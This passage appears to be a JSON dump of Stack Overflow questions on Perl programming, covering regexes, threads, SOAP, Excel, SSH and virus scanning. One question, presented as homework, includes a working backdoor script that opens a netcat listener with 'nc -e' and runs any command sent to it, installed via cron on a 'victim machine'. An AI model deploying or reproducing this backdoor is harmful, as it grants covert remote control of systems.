pass the variables but am not able to print the argument in perl.</li>\n<li>If i want to pass another variable lname, how do i append it to the url?</li>\n<li>My window.open should open the output in the same window, since it uses the parameter <code>_self</code>. Still it doesn't.</li>\n</ol>\n\n<p>Could anybody point out the problems?</p>\n\n<p>Thanks,\nBuzz</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":11849210,"title":"Use a MsgBox to echo a variable while running the Perl Script Remotely?","body":"<p>Is this possible?</p>\n\n<p>Using VB.net I am executing a remote perl script. I want a MsgBox to appear on my screen, similar to VBScript.</p>\n\n<p>I tried just doing Win32::MsgBox(\"Test\") but that didn't work.\nIs it even possible?</p>\n\n<p>I am executing the script remotely FROM a Windows system to a Unix system.</p>\n"},{"tags":["regex","perl","unix","sed","awk"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":1577,"score":7,"question_id":1714530,"title":"How can I delete all /* */ comments from a C source file?","body":"<p>I have a C file which I copied from somewhere else, but it has a lot of comments  like below:</p>\n\n<pre><code>int matrix[20];\n/* generate data */\nfor (index = 0 ;index &lt; 20; index++)\nmatrix[index] = index + 1;\n/* print original data */\nfor (index = 0; index &lt; 5 ;index++)\n</code></pre>\n\n<p>How can I delete all the comments enclosed by <code>/*</code>  and <code>*/</code>. Sometimes, the comments \nare consist of 4-5 lines, and i need to delete all those lines.</p>\n\n<p>Basically, I need to delete all text between <code>/*</code> and <code>*/</code> and even <code>\\n</code> can come in between. Please help me do this using one of <code>sed</code>, <code>awk</code> or <code>perl</code>.</p>\n"},{"tags":["perl","excel","ole"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":71,"score":-1,"question_id":13062522,"title":"invalid index in perl","body":"<p>I am very new to the perl programming. I am having a perl script which basically runs and produces output as a report in excel spreadsheet. I added another tab to this existing excel report and updated the variables in the perl script accordingly. When I execute this perl script after the changes, I am getting invalid index method/property get error. This is the script where it is throwing an error. Any help would be greatly appreciated, thanks.</p>\n\n<pre><code>#Begin subroutines\n    sub writeUUs\n    {\n        my ($sql1, $column1, $row1, $brandName1) = @_;\n        my $cellRange;\n        my $Sheet = $Book -&gt; Worksheets($brandName1);\n        $Sheet -&gt; Activate();\n</code></pre>\n"},{"tags":["windows","perl","iis","plink"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":2324,"score":1,"question_id":4877143,"title":"plink's host key is not cached in the registry when run from perl on IIS/Windows","body":"<p>I'm trying to start a perl script on another server from a web page and I'm having problems with plink: it doesn't seem to remember the host key when run from the IUSR_ user.</p>\n\n<p>I managed to reduce the problem this:</p>\n\n<pre><code>print \"Content-Type:text/plain\\n\\n\";\nopen(PLINK, \"| \\\"C:\\\\Program Files\\\\PuTTY\\\\plink.exe\\\" -pw sanitized Administrator\\@serveurftp.a.b.c whoami\") or die \"Can't fork: $!\";\nsleep(1);\nprint PLINK \"y\\n\";\nclose(PLINK);\n</code></pre>\n\n<p>When calling this script from a web page, I always get this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>The server's host key is not cached in the registry. You\nhave no guarantee that the server is the computer you\nthink it is.\nThe server's rsa2 key fingerprint is:\nssh-rsa 2048 cb:eb:dc:1b:9e:1c:6b:fa:63:fb:2e:ba:2c:61:26:c4\nIf you trust this host, enter \"y\" to add the key to\nPuTTY's cache and carry on connecting.\nIf you want to carry on connecting just once, without\nadding the key to the cache, enter \"n\".\nIf you do not trust this host, press Return to abandon the\nconnection.\nStore key in cache? (y/n) serveurftp\\administrator\n</code></pre>\n\n<p>I should only be getting this on the first time, and only \"serveurftp\\administrator\" afterwards, but it looks like plink can't store the host key when it's run from IIS.</p>\n\n<p>Do you guys have any idea on how to work around this?</p>\n"},{"tags":["perl","soap","soaplite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":645,"score":1,"question_id":5637932,"title":"Perl and Complex SOAP Request","body":"<p>I need to make a somewhat complex soap query using Perl, preferably using <code>SOAP::Lite</code>.  I know the service is active and have been successful in getting errors back from the other end.  Here is the soap query I need to make:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n&lt;soap:Body&gt;\n    &lt;GetCategories xmlns=\"http://webservices.uship.com\"&gt;\n        &lt;token&gt;string&lt;/token&gt;\n    &lt;/GetCategories&gt;\n&lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre>\n\n<p>This is my first time ever using a soap request as you can tell. I've googled until I'm googled out.  I appreciate any help the community could give.  Thanks!</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":68,"score":-6,"question_id":13062378,"title":"Subroutine to print list in reverse order","body":"<p>I have a question in Perl like this:</p>\n\n<p>Write a subroutine that uses recursion to print a list in reverse order. The subroutine must recursively call itself to print\nthe entire list; each invocation must print one word of the list. (Assume that the first call to your subroutine passes the \nvalue 0 and the list to be printed). Write a subroutine that counts the number of occurrences of the letter t in a string \n(which is passed to the subroutine). The subroutine must return the number of occurrences.</p>\n\n<p>Any idea how to solve this?</p>\n"},{"tags":["perl","selenium","automated-tests","test-class"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":13057660,"title":"Test Automation with Perl","body":"<p>I am working on building a test automation framework with Perl and Selenium for a web-application. </p>\n\n<p>I am weighing the pros and cons (with respect to maintainability of tests) of using Test::Routine v/s Test::Class . If there are people who have experience using either, can you please share your experiences ?</p>\n\n<p>I am a beginner , so any links to more information concerning the benefits of either would also be greatly beneficial.</p>\n\n<p>Thanks.</p>\n"},{"tags":["javascript","perl","cgi","onload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":52,"score":-1,"question_id":13061462,"title":"CGI Perl - Load Javascript on load, but only on specific criteria","body":"<p>I have a form that is displayed only when a particular link is clicked, and the options for a number of dropdown menus are populated by javascript.</p>\n\n<p>I need to run this javascript when the form loads, but I can only find examples where it is put in the  element and from what I understand, CGI Perl creates the  tag in the start_html function.</p>\n\n<p>Is there a way that I can trigger a javascript function only when the form is displayed?</p>\n\n<p>Edit: \nThe Form has two rows of dropdown menus. the javascript populates the options for the second row based on the selectedIndex values of the first row. I want the second row to be populated based on the defaults in the first row when the page loads. </p>\n"},{"tags":["perl","security","system-calls","netcat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":38,"score":-1,"question_id":13061216,"title":"Perl script making call to itself (through nc -e) is failing. Claiming no such file/dir","body":"<p>We have been asked to set up a backdoor in a victim machine for a homework assignment. I've gained access to the machine and I want to have the following script run on a <code>cron</code>, but it's throwing an error.</p>\n\n<p>I've verified that the <code>@ARGV</code> test works correctly by calling the program independently with and without the dummy <code>run</code> argument, but when I try and <code>netcat</code> into the victim machine on <code>port 35898</code> after initializing the script, the following error is all I get on connection.</p>\n\n<p><strong>Error:</strong> <code>exec /bin/vshell run failed : No such file or directory</code></p>\n\n<p>Obviously the program exists because the program is calling itself.</p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>#!/usr/bin/perl -w\n\n$| = 1;\nmy $prompt = '$ ';\n\n# run is just a dummy arg\nif(!@ARGV){ exec(\"nc -e '/bin/vshell run' -l -p 35898\"); die; }\n\nwhile(1){\n  print $prompt;\n  eval {\n    local $SIG{ALRM} = sub { die 'Goodbye!\\n'; };\n\n    alarm 60;\n    &amp;syscall;\n    alarm 0;\n  };\n  if( $@ ){ die; }\n}\n\nsub syscall{\n  if( defined( $_ = &lt;STDIN&gt; )){\n    chomp;\n    system( $_ );\n  }\n}\n</code></pre>\n\n<p>I've been at this for a while and I could really use a nudge in the right direction. Thanks!</p>\n\n<p>PS: This install of <code>nc</code> is compiled with the security hole which allows the <code>-e</code> flag and I have verified this functionality on other programs.</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":13,"down_vote_count":0,"view_count":267,"score":13,"question_id":12995540,"title":"How can I combine these regular expressions?","body":"<p>Four very identical regular expressions. I am replacing the strings with the following scalar values. How can this be more efficient?</p>\n\n<pre><code>$line =~ s/\\[(receiver)\\]/$receiver/g;\n$line =~ s/\\[(place)\\]/$place/g;\n$line =~ s/\\[(position)\\]/$position/g;\n$line =~ s/\\[(company)\\]/$company/g;\n</code></pre>\n\n<p>Thank you.</p>\n"},{"tags":["multithreading","perl","memory-leaks","leak"],"answer_count":1,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":155,"score":8,"question_id":12990085,"title":"Perl memory leak in threads (threads don't release memory)","body":"<p>I am now searching for 2 weeks about this problem and seems that I can't find any answer just searching on the web.</p>\n\n<p>So, here is two piece of code:</p>\n\n<p>1:</p>\n\n<pre><code>#! /usr/bin/perl\n\n#\n# RELEASE MEMORY\n#\n\nuse threads;\n\nmy @child;\n\n$ii=0;\n\n\nwhile (1)\n{\n  my @child = threads-&gt;new(\\&amp;test, \"test\");\n  $_-&gt;detach for @child;\n  print \"$ii\\n\";\n  $ii++;\n}\n\nsub test {\n    my ($ee) = 0;    \n}\n</code></pre>\n\n<p>2: </p>\n\n<pre><code>#! /usr/bin/perl\n\n#\n# DO NOT RELEASE MEMORY\n#\n\nuse threads;\n\nmy @child;\n\n$ii=0;\n\n\nfor($ii=0;$ii&lt;2000;$ii++) {\n    my @child = threads-&gt;new(\\&amp;test, \"test\");\n    $_-&gt;detach for @child;\n    print \"$ii\\n\";\n}\n\nwhile(1)\n{\n  sleep(10);\n}\n\nsub test {\n    my ($ee) = 0;    \n}\n</code></pre>\n\n<p>So here's the problem. The first code run only one infinite loop and it release memory back to operating system about each 2 seconds (according to ps) </p>\n\n<p>The second code is releasing memory too but only when he's running inside the \"for\" loop.\nOnce it exit the for loop and enter the infinite loop all the memory that have not been freed into the for loop is never released back to the operating system.</p>\n\n<p>Is anybody experiencing the same issue ? </p>\n\n<p>Perl: (v5.16.1) built for x86_64-linux-thread-multi</p>\n\n<p>OS: Debian 6.0.5</p>\n\n<p>Thanks a lot</p>\n\n<hr>\n\n<p>Edit 1:\nI used 800 threads and all verified that they exit by printing the $ee var.</p>\n\n<p>But once entering the while(1) loop here's the ps aux | grep perl output:</p>\n\n<pre><code>root@srv:~# ps aux | grep perl\nroot      6807 41.5  2.5 387780 209580 pts/0   S+   16:38   0:02 /opt/ActivePerl-5.16/bin/perl /home/tttlast.pl\nroot      7627  0.0  0.0   7548   856 pts/1    S+   16:38   0:00 grep perl\n</code></pre>\n\n<p>So all thread exited but the memory usage is still 2.5% of my server total memory.\nSo unless I kill the program the memory is still in use.</p>\n\n<hr>\n\n<p>Edit 2:</p>\n\n<p>I resolved my problem, I changed my structure. In fact the main program (the long running one) have been separated and I use small program who wait before all threads finish to exit.</p>\n\n<p>This way It doesn't full the virtual memory and other daemon are not killed.</p>\n\n<p>Thanks to everyone leading me to that solution.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13057511,"title":"Regular expression with hash keys and values","body":"<p>I am trying to check if the certain terms appear in the hash key, if they I tag them with the hash values. My code identifies an exact match but fails for terms that are slightly different. Also for the exact match the code tags the matched term with all values instead of the relevant one. </p>\n\n<pre><code>%Drugs = ('tamoxifen' =&gt; tablet,\n        'docotaxel' =&gt; capsule,\n        '5-hydroxycin' =&gt; IDK,);\n\n$sentence=\"tamoxifen 4-hydroxytamoxifen tamoxifen-incoded pre-docotaxel Drugs\";\n@sentence=split/ /,$sentence;\n@array=();\nforeach $word(@sentence)\n{\n    chomp $word;\n    for $keys(keys %Drugs)\n    {\n        if($Drugs{$word})\n        {\n            $term=\"&lt;$Drugs{$keys}&gt;$word&lt;$Drugs{$keys}&gt;\";\n            push(@array,$term);\n        }\n        elsif($word=~/.*$Drugs{$keys}$/i)\n        {\n            $term=\"&lt;$Drugs{$keys}&gt;$word&lt;$Drugs{$keys}&gt;\";\n            push(@array,$term);\n        }\n    }\n    foreach $Bio(@array)\n    {\n        print \"$Bio\\n\";\n    }\n</code></pre>\n\n<p>I want the output Sentence:</p>\n\n<pre><code>&lt;tablet&gt;tamoxifen&lt;/tablet&gt; &lt;tablet&gt;4-hydroxytamoxifen&lt;/tablet&gt; &lt;tablet&gt;tamoxifen-incoded&lt;tablet&gt; &lt;capsule&gt;pre-docotaxel&lt;capsule&gt; Drugs.(Here Drugs didn't match and hence it is left untagged)  \n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":13057014,"title":"endless loop in perl","body":"<p>I want to extract the content except http header from tcp flow files\nthe content is like the following\nthe http header ends when two ^M are met </p>\n\n<pre><code>HTTP/1.1 200 OK^M \nLast-Modified: Sat, 20 Mar 2010 09:43:12 GMT^M \nContent-Type: video/x-flv^M \nDate: Wed, 24 Oct 2012 14:34:13 GMT^M \nExpires: Wed, 24 Oct 2012 14:34:13 GMT^M \nCache-Control: private, max-age=22124^M \nAccept-Ranges: bytes^M \nContent-Length: 29833281^M \nConnection: close^M \nX-Content-Type-Options: nosniff^M \nServer: gvs 1.0^M \n^M \nFLV^A^E^@^@^@   ^@^@^@^@^R^@^CK^@^@^@^@^@^@^@^B^@ \nonMetaData^H^@^@^@^O^@^Hduration^@@i&lt;97&gt; \n=pÂ£Ã^@  starttime^@^@^@^@^@^@^@^@^@^@^Mtotalduration^@@i&lt;97&gt;\n</code></pre>\n\n<p>my code for extraction is as follows,\nand I run : extract.pl &lt; tcp.flow\nbut it seems the loop is endless,\nwhat is wrong with the codes? thanks! </p>\n\n<pre><code>#!/usr/bin/perl \n$start=0; \n$data=\"\"; \nwhile(&lt;STDIN&gt;) \n{ \n    if ( $start eq 0 &amp;&amp; $_ =~ /^\\r\\n/) { $start = 1; } \n    elsif ( $start eq 1 ) { $data = $data . $_; } \n} \nopen(FH, \"&gt;sample.flv\"); \nprint FH $data; \nclose(FH);\n</code></pre>\n"},{"tags":["arrays","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":13056915,"title":"Perl array shortcuts","body":"<p>Is it possible to create an array of string variables in perl without having to specify each single string that goes in the array? Like by using the \"..\" shortcut for letters and numbers.</p>\n\n<p>For example: </p>\n\n<pre><code>$v1 = \"hey\";\n$v2 = \"hello\";\n$v3 = \"bye\";\n$v4 = \"welcome\";\n\n@f = (\"$v1\" .. \"$v4\");\n</code></pre>\n\n<p>so that print $f[2]; would equal \"bye\"...</p>\n"},{"tags":["perl","perl-module"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13056905,"title":"Parse excel file with using Perl","body":"<p>I'm quite new in perl, so I'm asking for tips for the problem below :\nI have a excel file and I want to search for specific words in column title (1st row) then if \nit matches I extract the entire column and put it in a array (or whatever else).</p>\n\n<p>So in my array, I will have first column then 2nd etc... until the end of the search.</p>\n\n<p>I'm intending after that to read my array line by line to process data in order (I'm confortable for that part).</p>\n\n<p>thanks</p>\n"},{"tags":["multithreading","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":89,"score":3,"question_id":13051958,"title":"Perl parallel HTTP requests - out of memory","body":"<p>First of all, I'm new to Perl.\nI want to make multiple (e.g. 160) HTTP GET requests on a REST API in Perl. Executing them one after another takes much time, so I was thinking of running the requests in parallel. Therefore I used threads to execute more requests at the same time and limited the number of parallel requests to 10. \nThis worked just fine for the first time I ran the program, the second time I ran 'out of memory' after the 40th request. </p>\n\n<p>Here's the code: (@urls contains the 160 URLs for the requests)</p>\n\n<pre><code>while(@urls) {\n  my @threads;\n  for (my $j = 0; $j &lt; 10 and @urls; $j++) {\n    my $url = shift(@urls);\n    push @threads, async { $ua-&gt;get($url) };\n  }\n\n  for my $thread (@threads) {\n  my $response = $thread-&gt;join;\n  print \"$response\\n\"; \n }\n}\n</code></pre>\n\n<p>So my question is, why am I NOT running out of memory the first time but the second time (am I missing something crucial in my code)? And what can I do to prevent it?\nOr is there a better way of executing parallel GET requests?</p>\n"},{"tags":["perl","pattern-matching","glob"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":13052334,"title":"Perl Glob everything that doesn't end with zip","body":"<p>This is on windows - how do I glob, in perl, all files that don't end with \".zip\"?</p>\n\n<p>This is the current code, and for the purpose of this question, is not changeable - all that can be changed is the value of the $pattern variable.  </p>\n\n<pre><code>my @arr = map { glob( $_ ) } $pattern;\n</code></pre>\n\n<p>As an aside question, what is the purpose of the map function in this code?  It works, but I do not understand it.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":307,"score":0,"question_id":8394205,"title":"How can I parse ini file using Perl regex or in anyways?","body":"<p>I have this ini file.</p>\n\n<pre><code>day=Mon\ntime=01:00:00\noccurence=weekly\ntaskname=monitorschedule\ntaskrun=C:\\monitor.bat\n</code></pre>\n\n<p>I want to have an output like this for create a new schedule job in a windows xp.</p>\n\n<pre><code>schtasks.exe /create /tr c:\\monitor.bat /sc weekly /d Mon /st 01:00:00 /tn monitorschedule /ru \"system\"\n</code></pre>\n\n<p>I have tried something like this:</p>\n\n<pre><code>my $file = 'C:\\strawberry\\perltest\\ini file\\MonitorSchedule.ini';\nmy $d;\nmy $t;\nmy $o;\n  my $n;\n    my $r;\n    my $u = '\"system\"';\n\n    open (TEST, \"&lt;\", $file) or die $!; # open ini file\n    while(&lt;TEST&gt;) # read all lines of the ini file\n    {\n    if($_ =~ m/day/)\n    {\n    my $day = $_;\n    my @days = split('=', $day);\n    $d = $days[1];\n    }\n    if($_ =~ m/time/)\n    {\n    my $time = $_;\n    my @times = split('=', $time);\n    $t = $times[1];\n    }\n    if($_ =~ m/occurence/)\n    {\n    my $occurence = $_;\n    my @occurences = split('=', $occurence);\n    $o = $occurences[1];\n    }\n    if($_ =~ m/taskname/)\n    {\n    my $taskname = $_;\n    my @tasknames = split('=', $taskname);\n    $n = $tasknames[1];\n    }\n    if($_ =~ m/taskrun/)\n    {\n    my $taskrun = $_;\n    my @taskruns = split('=', $taskrun);\n    $r = $taskruns[1];\n        }\n    }\n    close TEST;\n\nprint \"schtasks.exe /create /tr $r /sc $o /d $d /st $t /tn $n /ru $u\";\n</code></pre>\n\n<p>Unfortunately the output is not what I want.</p>\n\n<pre><code>schtasks.exe /create /tr C:\\monitor.bat /ru \"system\".\n</code></pre>\n\n<p>I don't know whats wrong. Where am I wrong? please help out guys.</p>\n"},{"tags":["perl","sockets","antivirus"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13053597,"title":"Perls File::VirusScan using Daemon::ClamAV::Clamd says did not get PING response from clamd","body":"<p>First let me state, clamd has been proven to respond correctly:</p>\n\n<pre><code>$ echo PING | nc -U /var/run/clamav/clamd.sock\nPONG\n</code></pre>\n\n<p>the scanner was setup as follows:</p>\n\n<pre><code>#set up a Clamav scanner\nuse File::VirusScan;\nuse File::VirusScan::ResultSet;\nmy $scanner = File::VirusScan-&gt;new({\n    engines =&gt; {\n            '-Daemon::ClamAV::Clamd' =&gt; {\n                    socket_name =&gt; '/var/run/clamav/clamd.sock',\n            },\n    },\n});\n</code></pre>\n\n<p>and the whole script works fine on a Solaris 11 box. I'm running this on a Linux CentOS 5.3 (Final) I did have a problem installing File::VirusScan from CPAN, the latest version 0.102 won't compile and CPAN testers seems to confirm this as 435 fails out of 437. So I downloaded the prev 0.101 version from CPAN, the version I'm also running in Solaris and manually installed apparently ok</p>\n\n<pre><code>perl -v\nThis is perl, v5.8.8 built for x86_64-linux-thread-multi\n\n\nsub scanner {\n        $|++; # buffer disabled\n        (my $path, my $logClean) = @_;\n\n\n\n    my $recurse = 5;\n    print color \"yellow\";\n    print \"[i] Building file scan queue - recurse deepth $recurse \\n\";\n    print color \"green\";\n    print \"SCAN QUEUE:0\";\n\n    #Get list of files\n\n    if( $rootPath){\n     use File::Find::Rule;\n    my $finder = File::Find::Rule-&gt;maxdepth($recurse)-&gt;file-&gt;relative-&gt;start(\"$$path\");\n        while( my $file = $finder-&gt;match()  ){\n           $|++;\n           #$file = substr($file,length($rootPath)); #remove path bloat\n           push(@scanList,\"/$file\");\n           print \"\\rSCAN QUEUE:\" .scalar(@scanList);  #update screen\n        }\n    }else{\n     push(@scanList,\"$$path\");\n    }\n\n\n    print \"\\rSCANING:0\";\n    #set up a Clamav scanner\n    use File::VirusScan;\n    use File::VirusScan::ResultSet;\n    my $scanner = File::VirusScan-&gt;new({\n        engines =&gt; {\n                '-Daemon::ClamAV::Clamd' =&gt; {\n                        socket_name =&gt; '/var/run/clamav/clamd.sock',\n                },\n        },\n    });\n\n\n\n    #scan each file\n    my $scanning  = 0;\n    my $complete = -1;\n\n    foreach $scanFile (@scanList){\n             $scanning++;\n             ##################################################\n             #scan this file\n             $results = $scanner-&gt;scan($rootPath.$scanFile);\n             ##################################################\n                  #array of hashes\n             my $centDone = int(($scanning/scalar(@scanList))*100);\n\n             if($centDone &gt; $complete){\n                 $complete = $centDone;\n             }\n             if($centDone &lt; 100){\n                  #\\r to clear/update line\n                  $format = \"%-9s %-60s %-15s %-5s\";\n                  printf $format, (\"\\rSCANING:\", substr($scanFile,-50), \"$scanning/\".scalar(@scanList), \"$centDone%\");\n             }else{\n                  print \"\\rSCAN COMPLETE                                                                            \";\n             }\n\n             # array ref\n             foreach $result (@$results) {\n                        #array of pointers to hashes\n                      #print 'data:'\n                      #print 'state:'\n                       if($$result{state} ne \"clean\"){\n                           if($$result{data} =~ /^Clamd returned error: 2/){\n                               $$result{data} = \"File too big to scan\";\n                           }\n                           push(@scanResults,[$scanFile,$$result{state},$$result{data}]); # results\n                      }elsif($$logClean){\n                           push(@scanResults,[$scanFile,$$result{state},$$result{data}]);\n                      }\n                      unless($$result{state} eq \"clean\"){\n                                    print color \"red\";\n                                    print \"\\r$scanFile,$$result{state},$$result{data}\\n\";\n                                    print color \"green\";\n                                    print \"\\rSCANING: $scanning/\".scalar(@scanList).\" : $centDone%\";\n                               if($$result{state} eq \"virus\"){\n                                    push(@scanVirus,scalar(@scanResults)-1);  #scanResuts index of virus\n\n                               }elsif($$result{state} eq \"error\"){\n                                    push(@scanError,scalar(@scanResults)-1);  #scanResuts index of Error\n                               }\n                      }\n             }\n\n    } print \"\\n\";\n\n}\n</code></pre>\n"},{"tags":["perl","ssh"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":13056200,"title":"Perl - Permission denied with net::ssh","body":"<p>I have a very simple script that works just fine on one host but I get a \"permssion denied\" when I run it on another.  The code is:</p>\n\n<pre><code>#!/usr//local/bin/perl\nuse warnings;\nuse strict;\nuse English;\nuse Net::SSH::Perl;\nuse Log::Log4perl qw(get_logger);\n\nmy $conf = q(\nlog4perl.rootLogger=INFO, Logfile, Screen\nlog4perl.appender.Logfile          = Log::Log4perl::Appender::File\nlog4perl.appender.Logfile.filename = ./removeTempRetry.log\nlog4perl.appender.Logfile.layout =  Log::Log4perl::Layout::PatternLayout\nlog4perl.appender.Logfile.layout.ConversionPattern = [%H] %d %m %n\nlog4perl.appender.Screen             = Log::Log4perl::Appender::Screen\nlog4perl.appender.Screen.stderr      = 1\nlog4perl.appender.Screen.layout      = Log::Log4perl::Layout::SimpleLayout\n);\n\nLog::Log4perl::init(\\$conf);\nour $LOGGER = get_logger();\n\nmy $host = \"somehost\";\nmy $user = \"someuser\";\n\n  my $ssh = Net::SSH::Perl-&gt;new($host, identity_files =&gt; ['~/.ssh/BF1_dp_id_dsa'], debug =&gt; 1);\n  $ssh-&gt;login($user);\n</code></pre>\n\n<p>The output from the debug statement is:</p>\n\n<pre><code>host: Reading configuration data ~/.ssh/config\nhost: Reading configuration data /etc/ssh_config\nhost: Connecting to somehost, port 22.\nhost: Remote protocol version 2.0, remote software version OpenSSH_4.3\nhost: Net::SSH::Perl Version 1.34, protocol version 2.0.\nhost: No compat match: OpenSSH_4.3.\nhost: Connection established.\nhost: Sent key-exchange init (KEXINIT), wait response.\nhost: Algorithms, c-&gt;s: 3des-cbc hmac-sha1 none\nhost: Algorithms, s-&gt;c: 3des-cbc hmac-sha1 none\nhost: Entering Diffie-Hellman Group 1 key exchange.\nhost: Sent DH public key, waiting for reply.\nhost: Received host key, type 'ssh-dss'.\nhost: Host 'somehost' is known and matches the host key.\nhost: Computing shared secret key.\nhost: Verifying server signature.\nhost: Waiting for NEWKEYS message.\nhost: Send NEWKEYS.\nhost: Enabling encryption/MAC/compression.\nhost: Sending request for user-authentication service.\nhost: Service accepted: ssh-userauth.\nhost: Trying empty user-authentication request.\nhost: Authentication methods that can continue: publickey,gssapi-with-mic,password.\nhost: Next method to try is publickey.\nhost: Next method to try is password.\nhost: Trying password authentication.\nhost: Will not query passphrase in batch mode.\nhost: Authentication methods that can continue: publickey,gssapi-with-mic,password.\nhost: Next method to try is publickey.\nhost: Next method to try is password.\nhost: Trying password authentication.\nhost: Will not query passphrase in batch mode.\nhost: Authentication methods that can continue: publickey,gssapi-with-mic,password.\nhost: Next method to try is publickey.\nhost: Next method to try is password.\nhost: Trying password authentication.\nhost: Will not query passphrase in batch mode.\nhost: Authentication methods that can continue: publickey,gssapi-with-mic,password.\nhost: Next method to try is publickey.\nhost: Next method to try is password.\nPermission denied at ./removeTempRetry.pl line 26\n</code></pre>\n\n<p>I can ssh using the identity file and username that's in the code from that host on the command line with no problem.  And the exact same code works just fine from another host and I've used similar code before without problems.  I'm sure I'm overlooking something obvious.</p>\n\n<p>TIA</p>\n"},{"tags":["perl","api","xml-rpc","confluence"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":991,"score":4,"question_id":989485,"title":"Has anyone been able to get Confluence.pm to add attachments?","body":"<p>If so can you provide the code. I am able to do almost everything else from creating new pages, modifying page attributes etc.. But I cannot seem to add attachments. I have read the official <a href=\"http://confluence.atlassian.com/display/CONFEXT/Perl%2BXML-RPC%2Bclient\" rel=\"nofollow\">conflunce Perl XML-RPC site and discussions</a> but all the code fragments they show there don't seem to work for me.  Here is my hacked up attempt at it:</p>\n\n<pre><code># The following command sort of worked:\n# ~/bin/wikitool.pl -action attach_file -url $MYURL\n# IT attached something but the file was empty\nsub attach_file {\n    my $confluence = XMLRPC::Lite-&gt;proxy($opts{server}.\"rpc/xmlrpc\");\n    my $token = $confluence-&gt;call(\"confluence1.login\", $opts{login}, $opts{password})-&gt;result();\n\n    # Fetch page\n    my $page = FetchPage($opts{title});\n    if (not $page) {\n      dbg(\"$opts{title} page is missing.\",\"FATAL\");\n    }\n\n    my $pageId = SOAP::Data-&gt;type( string =&gt; $$page{id} );\n\n    my $filename = \"$ENV{HOME}/tmp/tmp0.gif\";\n    my $metadata = {\n        fileName =&gt; $filename,\n        contentType =&gt; \"image/gif\",\n        comment =&gt; \"Some random GIF\",\n    };\n    if (not open FILE, \"&lt; $filename\") {\n        dbg(\"Could not open file $filename: $!\\n\",\"FATAL\");\n    }\n    binmode FILE;\n    my $data;\n    $data .= $_ while (&lt;FILE&gt;);\n    my $call = $confluence-&gt;addAttachment($pageId, $metadata, $data);\n\n    my $fault = $call-&gt;fault();\n    if (defined $fault) {\n        dbg(\"could not attach $filename\" . $call-&gt;faultstring(), \"FATAL\");\n    }\n    else {\n      print \"attached $filename\\n\";\n    }\n}\n</code></pre>\n"},{"tags":["perl","excel","file","merge"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":13050659,"title":"Perl How to merge two or more excel files in one (multiple worksheets)?","body":"<p>I need to merge a few excel file into one, multiple sheets. \nI do not care too much about the sheet name on the new file.</p>\n\n<p>I do not have Excel on the computer I plan to run this. so I cannot use Win32 OLE.\nI attempted to run this code <a href=\"https://sites.google.com/site/mergingxlsfiles/\" rel=\"nofollow\">https://sites.google.com/site/mergingxlsfiles/</a> but it is not working, I get a new empty excel file.</p>\n\n<p>I attempt to run <a href=\"http://www.perlmonks.org/?node_id=743574\" rel=\"nofollow\">http://www.perlmonks.org/?node_id=743574</a> but I only obtained one of the file in the new excel file.</p>\n\n<p>My input excel files have some french characters (Ã© for e.g.) I believe these are cp1252. </p>\n\n<p>Code used : </p>\n\n<pre><code>    #!/usr/bin/perl -w\n    use strict;\n    use Spreadsheet::ParseExcel;\n    use Spreadsheet::WriteExcel;\n    use File::Glob qw(bsd_glob);\n    use Getopt::Long;\n    use POSIX qw(strftime);\n\n    GetOptions(\n        'output|o=s' =&gt; \\my $outfile,\n        'strftime|t' =&gt; \\my $do_strftime,\n    ) or die;\n\n    if ($do_strftime) {\n        $outfile = strftime $outfile, localtime;\n    };\n\n    my $output = Spreadsheet::WriteExcel-&gt;new($outfile)\n        or die \"Couldn't create '$outfile': $!\";\n\n    for (@ARGV) {\n        my ($filename,$sheetname,$targetname);\n        my @files;\n        if (m!^(.*\\.xls):(.*?)(?::([\\w ]+))$!) {\n            ($filename,$sheetname,$targetname) = ($1,qr($2),$3);\n            warn $filename;\n            if ($do_strftime) {\n                $filename = strftime $filename, localtime;\n            };\n            @files = glob $filename;\n        } else {\n            ($filename,$sheetname,$targetname) = ($_,qr(.*),undef);\n            if ($do_strftime) {\n                $filename = strftime $filename, 